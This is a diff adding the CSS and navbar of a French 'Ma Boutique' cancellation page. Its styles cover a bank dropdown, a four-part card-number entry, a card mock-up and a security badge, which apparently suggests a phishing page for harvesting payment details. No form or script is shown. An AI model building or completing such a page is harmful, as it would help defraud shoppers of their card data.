@@ -1,0 +1,2064 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ma Boutique – Annulation</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --navy:          #1e3a6e;
+      --blue-nav:      #2a4d96;
+      --blue-nav-dark: #1e3a6e;
+      --blue-btn:      #1e4fa3;
+      --blue-btn-h:    #163d86;
+      --grey-btn:      #f4f6fa;
+      --grey-btn-h:    #e8ecf4;
+      --text-dark:     #1a2a45;
+      --text-mid:      #4a5a75;
+      --border:        #dde3ef;
+      --white:         #ffffff;
+      --shadow:        0 2px 16px rgba(26,60,110,0.10);
+    }
+
+    body {
+      font-family: 'Nunito', sans-serif;
+      background: #f0f3f9;
+      min-height: 100vh;
+    }
+
+    .navbar {
+      background: var(--white);
+      box-shadow: var(--shadow);
+      border-bottom: 1.5px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 200;
+      width: 100%;
+    }
+
+    .navbar__inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 36px;
+      height: 76px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .navbar__logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      flex-shrink: 0;
+    }
+
+    .navbar__logo img {
+      height: 52px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    .navbar__logo-fallback {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo-icon {
+      width: 50px;
+      height: 50px;
+      background: var(--navy);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      font-weight: 900;
+      color: #fff;
+    }
+
+    .logo-name {
+      font-size: 1.35rem;
+      font-weight: 900;
+      color: var(--navy);
+      letter-spacing: -0.4px;
+    }
+
+    .navbar__actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn-nav {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      padding: 9px 18px;
+      border-radius: 8px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 0.88rem;
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+      transition: background .18s, box-shadow .18s, transform .12s;
+      white-space: nowrap;
+      text-decoration: none;
+    }
+    .btn-nav:active { transform: scale(.97); }
+
+    .btn-nav--ghost {
+      background: var(--grey-btn);
+      color: var(--text-dark);
+      border: 1.5px solid var(--border);
+    }
+    .btn-nav--ghost:hover { background: var(--grey-btn-h); box-shadow: 0 2px 8px rgba(26,60,110,.08); }
+
+    .btn-nav--primary {
+      background: var(--blue-btn);
+      color: #fff;
+      border: 1.5px solid var(--blue-btn);
+      box-shadow: 0 2px 10px rgba(30,79,163,.18);
+    }
+    .btn-nav--primary:hover { background: var(--blue-btn-h); box-shadow: 0 4px 14px rgba(30,79,163,.28); }
+
+    .navbar__hamburger {
+      display: none;
+      flex-direction: column;
+      gap: 5px;
+      cursor: pointer;
+      padding: 6px;
+      border: none;
+      background: none;
+    }
+    .navbar__hamburger span {
+      display: block; width: 24px; height: 2.5px;
+      background: var(--navy); border-radius: 2px;
+      transition: transform .3s, opacity .3s;
+    }
+    .navbar__hamburger.open span:nth-child(1) { transform: translateY(7.5px) rotate(45deg); }
+    .navbar__hamburger.open span:nth-child(2) { opacity: 0; }
+    .navbar__hamburger.open span:nth-child(3) { transform: translateY(-7.5px) rotate(-45deg); }
+
+    .navbar__mobile-menu {
+      display: none;
+      flex-direction: column;
+      gap: 8px;
+      padding: 12px 20px 16px;
+      border-top: 1.5px solid var(--border);
+      background: var(--white);
+      animation: slideDown .22s ease;
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .navbar__mobile-menu.open { display: flex; }
+    .navbar__mobile-menu .btn-nav { width: 100%; justify-content: center; font-size: .92rem; padding: 11px 16px; }
+
+    .subnav {
+      background: var(--blue-nav);
+      width: 100%;
+      position: sticky;
+      top: 76px;
+      z-index: 190;
+      border-bottom: 2px solid var(--blue-nav-dark);
+    }
+
+    .subnav__inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 36px;
+      height: 46px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .subnav__left {
+      display: flex;
+      align-items: center;
+      gap: 2px;
+    }
+
+    .subnav__right {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .snav-item {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 0 14px;
+      height: 46px;
+      color: rgba(255,255,255,.92);
+      font-size: .82rem;
+      font-weight: 700;
+      text-decoration: none;
+      letter-spacing: .3px;
+      text-transform: uppercase;
+      transition: background .15s, color .15s;
+      cursor: pointer;
+      border: none;
+      background: none;
+      font-family: 'Nunito', sans-serif;
+      white-space: nowrap;
+    }
+    .snav-item:hover { background: rgba(255,255,255,.12); color: #fff; }
+
+    .snav-item svg { flex-shrink: 0; }
+
+    .snav-sep {
+      width: 1px;
+      height: 20px;
+      background: rgba(255,255,255,.2);
+      margin: 0 4px;
+    }
+
+    .subnav__mobile {
+      display: none;
+      padding: 10px 18px 14px;
+      background: var(--blue-nav);
+      flex-direction: column;
+      gap: 4px;
+      animation: slideDown .22s ease;
+    }
+    .subnav__mobile.open { display: flex; }
+    .subnav__mobile .snav-item { height: 38px; font-size: .8rem; justify-content: flex-start; }
+
+    .snav-burger {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      color: #fff;
+      font-size: .82rem;
+      font-weight: 700;
+      cursor: pointer;
+      padding: 0 10px;
+      height: 46px;
+      border: none;
+      background: none;
+      font-family: 'Nunito', sans-serif;
+    }
+    .snav-burger span { display: block; width: 20px; height: 2px; background: #fff; border-radius: 2px; }
+
+    .hero {
+      position: relative;
+      width: 100%;
+      height: 520px;
+      overflow: hidden;
+    }
+
+    .hero__bg {
+      position: absolute;
+      inset: 0;
+      background-size: cover;
+      background-position: center;
+      opacity: 0;
+      transition: opacity 1.4s ease-in-out;
+    }
+
+    .hero__bg.active { opacity: 1; }
+
+    .hero__bg--1 { background-image: url('bg1.png'), linear-gradient(135deg, #1e3a6e 0%, #2a5298 50%, #1a7a9a 100%); }
+    .hero__bg--2 { background-image: url('bg2.png'), linear-gradient(135deg, #1a5276 0%, #1e3a6e 50%, #2e4da3 100%); }
+
+    .hero__overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(
+        to right,
+        rgba(10,20,50,.62) 0%,
+        rgba(10,20,50,.38) 60%,
+        rgba(10,20,50,.15) 100%
+      );
+      z-index: 2;
+    }
+
+    .hero__content {
+      position: relative;
+      z-index: 3;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 36px;
+      height: 100%;
+      display: flex;
+      align-items: center;
+    }
+
+    .hero__card {
+      background: rgba(255,255,255,.13);
+      backdrop-filter: blur(14px) saturate(1.4);
+      -webkit-backdrop-filter: blur(14px) saturate(1.4);
+      border: 1px solid rgba(255,255,255,.25);
+      border-radius: 18px;
+      padding: 38px 44px;
+      max-width: 560px;
+      box-shadow: 0 8px 40px rgba(0,0,0,.28), inset 0 1px 0 rgba(255,255,255,.2);
+      animation: fadeUp .8s ease both;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(28px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .hero__badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: rgba(255,80,80,.22);
+      border: 1px solid rgba(255,100,100,.4);
+      color: #ffb3b3;
+      border-radius: 20px;
+      padding: 4px 13px;
+      font-size: .75rem;
+      font-weight: 800;
+      letter-spacing: .5px;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+    .hero__badge svg { width: 13px; height: 13px; }
+
+    .hero__title {
+      font-size: 2rem;
+      font-weight: 900;
+      color: #fff;
+      line-height: 1.2;
+      margin-bottom: 14px;
+      text-shadow: 0 2px 12px rgba(0,0,0,.3);
+    }
+
+    .hero__title span { color: #7ecfff; }
+
+    .hero__desc {
+      font-size: .97rem;
+      color: rgba(255,255,255,.88);
+      line-height: 1.65;
+      margin-bottom: 28px;
+    }
+
+    .hero__cta {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: #e63946;
+      color: #fff;
+      font-family: 'Nunito', sans-serif;
+      font-size: 1rem;
+      font-weight: 800;
+      padding: 14px 28px;
+      border-radius: 10px;
+      border: none;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow: 0 4px 18px rgba(230,57,70,.45);
+      transition: background .18s, transform .12s, box-shadow .18s;
+      letter-spacing: .2px;
+    }
+    .hero__cta:hover {
+      background: #c1121f;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(230,57,70,.5);
+    }
+    .hero__cta:active { transform: scale(.97); }
+
+    .hero__dots {
+      position: absolute;
+      bottom: 18px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 4;
+      display: flex;
+      gap: 8px;
+    }
+    .hero__dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: rgba(255,255,255,.4);
+      transition: background .4s, transform .4s;
+      cursor: pointer;
+    }
+    .hero__dot.active { background: #fff; transform: scale(1.3); }
+
+    .wave-sep {
+      position: relative;
+      height: 60px;
+      background: #f0f3f9;
+      overflow: hidden;
+      margin-top: -2px;
+    }
+    .wave-sep svg {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    .form-section {
+      position: relative;
+      padding: 60px 36px 80px;
+      min-height: 100vh;
+    }
+
+    .form-section::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: url('bg1.png'), linear-gradient(135deg, #1e3a6e 0%, #2a5298 50%, #1a7a9a 100%);
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      opacity: .18;
+      z-index: 0;
+    }
+
+    .form-section__inner {
+      max-width: 780px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+    }
+
+    .form-logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 28px;
+    }
+
+    .form-logo img {
+      height: 56px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    .form-logo-fallback {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .form-logo-fallback .fl-icon {
+      width: 54px;
+      height: 54px;
+      background: var(--navy);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: 900;
+      color: #fff;
+    }
+
+    .form-logo-fallback .fl-name {
+      font-size: 1.5rem;
+      font-weight: 900;
+      color: var(--navy);
+    }
+
+    .form-card {
+      background: rgba(255,255,255,0.82);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border: 1.5px solid rgba(30,79,163,0.13);
+      border-radius: 20px;
+      padding: 46px 52px;
+      box-shadow: 0 8px 40px rgba(26,60,110,0.13), 0 2px 8px rgba(26,60,110,0.06);
+    }
+
+    .form-card__header {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+
+    .form-card__header h2 {
+      font-size: 1.7rem;
+      font-weight: 900;
+      color: var(--navy);
+      margin-bottom: 8px;
+    }
+
+    .form-card__header p {
+      font-size: .97rem;
+      color: var(--text-mid);
+      line-height: 1.6;
+    }
+
+    .form-divider {
+      width: 56px;
+      height: 4px;
+      background: linear-gradient(90deg, var(--blue-btn), #4fa3e0);
+      border-radius: 2px;
+      margin: 14px auto 0;
+    }
+
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 18px 24px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .form-group--full { grid-column: 1 / -1; }
+
+    .form-group label {
+      font-size: .82rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      letter-spacing: .3px;
+      text-transform: uppercase;
+    }
+
+    .form-group label span { color: #e63946; margin-left: 2px; }
+
+    .form-control {
+      width: 100%;
+      padding: 11px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 9px;
+      font-family: 'Nunito', sans-serif;
+      font-size: .95rem;
+      color: var(--text-dark);
+      background: #f8fafd;
+      transition: border-color .18s, box-shadow .18s, background .18s;
+      outline: none;
+    }
+
+    .form-control:focus {
+      border-color: var(--blue-btn);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(30,79,163,.1);
+    }
+
+    select.form-control { cursor: pointer; }
+
+    textarea.form-control {
+      resize: vertical;
+      min-height: 110px;
+    }
+
+    .form-submit {
+      width: 100%;
+      margin-top: 28px;
+      padding: 15px;
+      background: linear-gradient(135deg, #1e4fa3, #2a6dd9);
+      color: #fff;
+      font-family: 'Nunito', sans-serif;
+      font-size: 1.05rem;
+      font-weight: 800;
+      border: none;
+      border-radius: 11px;
+      cursor: pointer;
+      box-shadow: 0 4px 18px rgba(30,79,163,.32);
+      transition: background .18s, transform .12s, box-shadow .18s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      letter-spacing: .2px;
+    }
+
+    .form-submit:hover {
+      background: linear-gradient(135deg, #163d86, #1e4fa3);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 28px rgba(30,79,163,.38);
+    }
+
+    .form-submit:active { transform: scale(.98); }
+
+    .form-note {
+      text-align: center;
+      margin-top: 16px;
+      font-size: .8rem;
+      color: var(--text-mid);
+    }
+
+    .form-note a { color: var(--blue-btn); text-decoration: none; font-weight: 700; }
+    .form-note a:hover { text-decoration: underline; }
+
+    .section-desc {
+      font-size: .88rem;
+      color: var(--text-mid);
+      line-height: 1.65;
+      margin-bottom: 18px;
+      padding: 10px 14px;
+      background: rgba(30,79,163,.05);
+      border-left: 3px solid var(--blue-btn);
+      border-radius: 0 8px 8px 0;
+    }
+
+    .field-hint {
+      font-size: .76rem;
+      color: var(--text-mid);
+      margin-bottom: 4px;
+      line-height: 1.5;
+    }
+
+    .bank-dropdown {
+      position: relative;
+      user-select: none;
+    }
+
+    .bank-selected {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      padding: 10px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 9px;
+      background: #f8fafd;
+      cursor: pointer;
+      transition: border-color .18s, box-shadow .18s;
+      min-height: 44px;
+    }
+
+    .bank-selected:hover,
+    .bank-dropdown.open .bank-selected {
+      border-color: var(--blue-btn);
+      box-shadow: 0 0 0 3px rgba(30,79,163,.1);
+      background: #fff;
+    }
+
+    .bank-selected__placeholder {
+      font-size: .93rem;
+      color: #9aadca;
+    }
+
+    .bank-selected__bank {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .bank-selected__bank img {
+      width: 32px;
+      height: 22px;
+      object-fit: contain;
+      border-radius: 3px;
+    }
+
+    .bank-selected__bank span {
+      font-size: .93rem;
+      font-weight: 700;
+      color: var(--text-dark);
+    }
+
+    .bank-dropdown__arrow {
+      flex-shrink: 0;
+      color: var(--text-mid);
+      transition: transform .25s;
+    }
+
+    .bank-dropdown.open .bank-dropdown__arrow {
+      transform: rotate(180deg);
+    }
+
+    .bank-options {
+      display: none;
+      position: absolute;
+      top: calc(100% + 6px);
+      left: 0; right: 0;
+      background: #fff;
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(26,60,110,.14);
+      z-index: 50;
+      max-height: 320px;
+      overflow-y: auto;
+      padding: 6px;
+    }
+
+    .bank-dropdown.open .bank-options {
+      display: block;
+      animation: slideDown .18s ease;
+    }
+
+    .bank-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 9px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background .14s;
+    }
+
+    .bank-option:hover {
+      background: #f0f4fc;
+    }
+
+    .bank-option img {
+      width: 38px;
+      height: 26px;
+      object-fit: contain;
+      flex-shrink: 0;
+      border-radius: 4px;
+      border: 1px solid #eee;
+      padding: 2px;
+      background: #fff;
+    }
+
+    .bank-option span {
+      font-size: .9rem;
+      font-weight: 700;
+      color: var(--text-dark);
+    }
+
+    .bank-option--other {
+      border-top: 1px solid var(--border);
+      margin-top: 4px;
+      padding-top: 12px;
+      color: var(--text-mid);
+    }
+
+    .bank-option--other span {
+      color: var(--text-mid);
+      font-weight: 600;
+    }
+
+    .bank-section-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 32px 0 20px;
+    }
+
+    .bank-section-title .bst-line {
+      flex: 1;
+      height: 1.5px;
+      background: var(--border);
+    }
+
+    .bank-section-title span {
+      font-size: .78rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      letter-spacing: .6px;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+
+    .bank-select-wrap {
+      position: relative;
+    }
+
+    .bank-select-wrap select {
+      padding-left: 14px;
+      appearance: none;
+      -webkit-appearance: none;
+    }
+
+    .bank-select-wrap::after {
+      content: '';
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 0;
+      height: 0;
+      border-left: 5px solid transparent;
+      border-right: 5px solid transparent;
+      border-top: 6px solid var(--text-mid);
+      pointer-events: none;
+    }
+
+    .cb-visual-wrap {
+      perspective: 1000px;
+      margin-bottom: 28px;
+    }
+
+    .cb-card {
+      width: 100%;
+      max-width: 380px;
+      height: 220px;
+      margin: 0 auto;
+      border-radius: 18px;
+      background: linear-gradient(135deg, #1e3a6e 0%, #2a5298 45%, #1a7a9a 100%);
+      position: relative;
+      box-shadow: 0 18px 50px rgba(26,60,110,.38), 0 6px 20px rgba(0,0,0,.2);
+      overflow: hidden;
+      transition: transform .4s ease;
+      cursor: default;
+    }
+
+    .cb-card:hover {
+      transform: rotateY(-8deg) rotateX(3deg);
+    }
+
+    .cb-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(
+        120deg,
+        transparent 20%,
+        rgba(255,255,255,.06) 40%,
+        rgba(255,255,255,.13) 50%,
+        rgba(255,255,255,.06) 60%,
+        transparent 80%
+      );
+      z-index: 1;
+    }
+
+    .cb-card::after {
+      content: '';
+      position: absolute;
+      top: -40px;
+      right: -40px;
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      background: rgba(255,255,255,.05);
+    }
+
+    .cb-deco-circle {
+      position: absolute;
+      bottom: -60px;
+      left: -30px;
+      width: 220px;
+      height: 220px;
+      border-radius: 50%;
+      background: rgba(255,255,255,.04);
+    }
+
+    .cb-img {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 18px;
+      opacity: .18;
+    }
+
+    .cb-content {
+      position: relative;
+      z-index: 2;
+      padding: 22px 26px;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .cb-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+    }
+
+    .cb-bank-name {
+      font-size: .78rem;
+      font-weight: 800;
+      color: rgba(255,255,255,.7);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+    }
+
+    .cb-chip {
+      width: 42px;
+      height: 32px;
+      background: linear-gradient(135deg, #d4a946, #f0c960, #b8922e);
+      border-radius: 6px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .cb-chip::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 0; right: 0;
+      height: 1.5px;
+      background: rgba(0,0,0,.2);
+      transform: translateY(-50%);
+    }
+
+    .cb-chip::after {
+      content: '';
+      position: absolute;
+      left: 50%;
+      top: 0; bottom: 0;
+      width: 1.5px;
+      background: rgba(0,0,0,.2);
+      transform: translateX(-50%);
+    }
+
+    .cb-number-display {
+      font-size: 1.22rem;
+      font-weight: 700;
+      color: rgba(255,255,255,.95);
+      letter-spacing: 3px;
+      font-family: 'Courier New', monospace;
+      text-align: center;
+    }
+
+    .cb-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+    }
+
+    .cb-holder {
+      font-size: .72rem;
+      color: rgba(255,255,255,.6);
+      letter-spacing: .5px;
+      text-transform: uppercase;
+    }
+
+    .cb-holder strong {
+      display: block;
+      font-size: .85rem;
+      color: rgba(255,255,255,.92);
+      letter-spacing: 1px;
+      margin-top: 2px;
+    }
+
+    .cb-network {
+      display: flex;
+      align-items: center;
+    }
+
+    .cb-mc {
+      display: flex;
+    }
+
+    .cb-mc span {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+    }
+
+    .cb-mc span:first-child {
+      background: #eb001b;
+      opacity: .9;
+    }
+
+    .cb-mc span:last-child {
+      background: #f79e1b;
+      opacity: .9;
+      margin-left: -12px;
+    }
+
+    .cb-field-icon {
+      position: relative;
+    }
+
+    .cb-field-icon input {
+      padding-right: 44px;
+      letter-spacing: 2px;
+      font-family: 'Courier New', monospace;
+      font-size: .98rem;
+    }
+
+    .cb-field-icon .fi-icon {
+      position: absolute;
+      right: 13px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-mid);
+      opacity: .5;
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 20px;
+      padding: 10px 16px;
+      background: rgba(34,197,94,.08);
+      border: 1px solid rgba(34,197,94,.2);
+      border-radius: 9px;
+      font-size: .78rem;
+      font-weight: 700;
+      color: #16a34a;
+    }
+
+    .security-badge svg { flex-shrink: 0; }
+
+    .body-img {
+      width: 100%;
+      display: block;
+      line-height: 0;
+    }
+
+    .body-img img {
+      width: 100%;
+      height: auto;
+      display: block;
+      object-fit: cover;
+    }
+
+    .body-img-fallback {
+      width: 100%;
+      height: 180px;
+      background: linear-gradient(135deg, #1e3a6e 0%, #2a5298 50%, #1a7a9a 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: rgba(255,255,255,.4);
+      font-size: .85rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .site-footer {
+      width: 100%;
+      display: block;
+      line-height: 0;
+    }
+
+    .site-footer img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    #loadingScreen {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(145deg, #0f1e3d 0%, #1e3a6e 50%, #2a5298 100%);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loading-inner {
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+      animation: fadeUp .5s ease both;
+    }
+
+    .loading-logo {
+      height: 64px;
+      width: auto;
+      object-fit: contain;
+      filter: brightness(0) invert(1);
+      opacity: .92;
+    }
+
+    .loading-logo-fallback {
+      align-items: center;
+      gap: 12px;
+    }
+
+    .ll-icon {
+      width: 58px; height: 58px;
+      background: rgba(255,255,255,.15);
+      border: 2px solid rgba(255,255,255,.3);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      font-weight: 900;
+      color: #fff;
+    }
+
+    .ll-name {
+      font-size: 1.5rem;
+      font-weight: 900;
+      color: #fff;
+    }
+
+    .loading-spinner {
+      position: relative;
+      width: 72px;
+      height: 72px;
+      margin: 6px 0;
+    }
+
+    .spinner-ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 4px solid transparent;
+      border-top-color: rgba(255,255,255,.9);
+      border-right-color: rgba(255,255,255,.3);
+      animation: spin 1s linear infinite;
+    }
+
+    .spinner-ring--2 {
+      inset: 10px;
+      border-top-color: #4fa3e0;
+      border-right-color: transparent;
+      border-bottom-color: rgba(79,163,224,.3);
+      animation-duration: 1.6s;
+      animation-direction: reverse;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loading-title {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: .2px;
+    }
+
+    .loading-sub {
+      font-size: .88rem;
+      color: rgba(255,255,255,.6);
+      margin-top: -10px;
+    }
+
+    .loading-bar-wrap {
+      width: 260px;
+      height: 6px;
+      background: rgba(255,255,255,.15);
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    .loading-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #4fa3e0, #7ecfff);
+      border-radius: 6px;
+      transition: width .12s ease;
+    }
+
+    .loading-pct {
+      font-size: .82rem;
+      font-weight: 800;
+      color: rgba(255,255,255,.5);
+      margin-top: -10px;
+    }
+
+    .step-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+      margin-bottom: 32px;
+      position: relative;
+      flex-wrap: wrap;
+    }
+
+    .step-dot {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: #d0daf0;
+      color: var(--text-mid);
+      font-size: .82rem;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+      transition: background .3s, color .3s;
+    }
+
+    .step-dot--done {
+      background: #22c55e;
+      color: #fff;
+    }
+
+    .step-dot--active {
+      background: var(--blue-btn);
+      color: #fff;
+      box-shadow: 0 0 0 4px rgba(30,79,163,.2);
+    }
+
+    .step-line {
+      flex: 1;
+      max-width: 80px;
+      height: 3px;
+      background: #d0daf0;
+      margin: 0 4px;
+    }
+
+    .step-line--done { background: #22c55e; }
+
+    .step-label-row {
+      position: absolute;
+      bottom: -22px;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-between;
+      padding: 0 0px;
+    }
+
+    .step-label-row span {
+      font-size: .72rem;
+      font-weight: 700;
+      color: var(--text-mid);
+      text-align: center;
+      flex: 1;
+    }
+
+    .page-fadein {
+      animation: fadeUp .55s ease both;
+    }
+
+    /* ══════════════════════════════
+       CB NUMBER — 4 CHAMPS SÉPARÉS
+    ══════════════════════════════ */
+    .cb-number-fields {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      width: 100%;
+    }
+
+    .cb-number-fields input {
+      text-align: center;
+      letter-spacing: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 1.1rem;
+      font-weight: 700;
+      padding: 11px 6px;
+      border: 1.5px solid var(--border);
+      border-radius: 9px;
+      color: var(--text-dark);
+      background: #f8fafd;
+      transition: border-color .18s, box-shadow .18s, background .18s;
+      outline: none;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .cb-number-fields input:focus {
+      border-color: var(--blue-btn);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(30,79,163,.1);
+    }
+
+    @media (max-width: 480px) {
+      .cb-number-fields {
+        gap: 6px;
+      }
+      .cb-number-fields input {
+        font-size: .95rem;
+        letter-spacing: 2px;
+        padding: 10px 4px;
+      }
+    }
+
+    @media (max-width: 680px) {
+      .form-section { padding: 40px 16px 60px; }
+      .form-card { padding: 28px 18px; }
+      .form-grid { grid-template-columns: 1fr; }
+      .form-group--full { grid-column: 1; }
+      .form-card__header h2 { font-size: 1.35rem; }
+    }
+
+    @media (max-width: 960px) {
+      .subnav__inner { display: none; }
+      .snav-burger { display: flex; }
+    }
+
+    @media (max-width: 720px) {
+      .navbar__actions { display: none; }
+      .navbar__hamburger { display: flex; }
+      .navbar__inner { padding: 0 18px; height: 66px; }
+      .navbar__logo img { height: 44px; }
+      .logo-icon { width: 44px; height: 44px; }
+      .subnav { top: 66px; }
+      .subnav__inner { display: none; }
+
+      .hero { height: 460px; }
+      .hero__card { padding: 26px 22px; max-width: 100%; }
+      .hero__title { font-size: 1.5rem; }
+      .hero__content { padding: 0 16px; align-items: flex-end; padding-bottom: 48px; }
+
+      .form-section { padding: 32px 12px 60px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="navbar">
+    <div class="navbar__inner">
+      <a href="#" class="navbar__logo">
+        <img src="logo.png" alt="Logo"
+             onerror="this.style.display='none'; document.getElementById('logoFallback').style.display='flex';" />
+        <span class="navbar__logo-fallback" id="logoFallback" style="display:none;">
+          <span class="logo-icon">M</span>
+          <span class="logo-name">Ma Boutique</span>
+        </span>
+      </a>
+
+      <nav class="navbar__actions">
+        <a href="#" class="btn-nav btn-nav--ghost">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+          </svg>
+          Aide / FAQ
+        </a>
+        <a href="#" class="btn-nav btn-nav--ghost">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 18v-6a9 9 0 0 1 18 0v6"/>
+            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"/>
+            <path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/>
+          </svg>
+          Service client
+        </a>
+        <a href="#" class="btn-nav btn-nav--primary">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+            <circle cx="12" cy="7" r="4"/>
+          </svg>
+          Espace adhérent
+        </a>
+      </nav>
+
